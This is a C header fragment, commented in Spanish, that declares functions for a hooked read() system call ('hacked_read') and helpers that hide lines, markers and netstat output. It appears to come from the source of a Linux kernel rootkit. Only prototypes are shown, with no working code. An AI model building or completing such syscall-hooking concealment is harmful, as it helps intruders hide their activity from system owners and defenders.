/* funciones de read.c */

asmlinkage ssize_t hacked_read(int fd, void *buf, size_t nbytes);
int checkear(void *arg, int size);
int hide_marcas(void *arg, int size);
int ocultar_linea(char *linea);
int ocultar_netstat(char *arg, int size);
int copiar_linea(char *dst, char *from, int index);

